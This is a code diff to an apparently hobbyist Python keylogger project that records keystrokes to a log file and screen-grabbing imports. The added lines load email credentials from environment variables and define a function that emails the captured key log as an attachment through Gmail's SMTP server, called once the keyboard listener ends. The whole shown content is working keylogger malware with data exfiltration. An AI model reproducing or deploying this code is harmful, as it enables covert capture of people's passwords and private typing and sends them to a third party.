@@ -26,6 +26,13 @@ from requests import get
 
 from multiprocessing import freeze_support, Process
 from PIL import ImageGrab
+from dotenv import load_dotenv
+
+load_dotenv()
+
+email_address = os.getenv('FROM_EMAIL_USER')
+password = os.getenv('EMAIL_PASSWORD')
+toaddr = os.getenv('TO_EMAIL_USER')
 
 key_information = "key_log.txt"
 file_path = "/Users/rachittanwar/Documents/[02]/Coding/Cybersecurity/Python Keylogger/project"
@@ -33,6 +40,29 @@ extend = "/"
 
 count = 0
 keys = []
+
+# email controls
+def send_email(filename, attachment, toaddr):
+    fromaddr = email_address
+    msg = MIMEMultipart()
+    msg['From'] = fromaddr
+    msg['To'] = toaddr
+    msg['Subject'] = "Log File"
+    body = "Body_of_the_mail"
+    msg.attach(MIMEText(body, 'plain'))
+    filename = filename
+    attachment = open(attachment, 'rb')
+    p = MIMEBase('application', 'octet-stream')
+    p.set_payload((attachment).read())
+    encoders.encode_base64(p)
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+    msg.attach(p)
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.starttls()
+    s.login(fromaddr, password)
+    text = msg.as_string()
+    s.sendmail(fromaddr, toaddr, text)
+    s.quit()
 
 def on_press(key):
     global keys, count
@@ -63,3 +93,5 @@ def on_release(key):
     
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
+send_email(key_information, file_path + extend + key_information, toaddr)
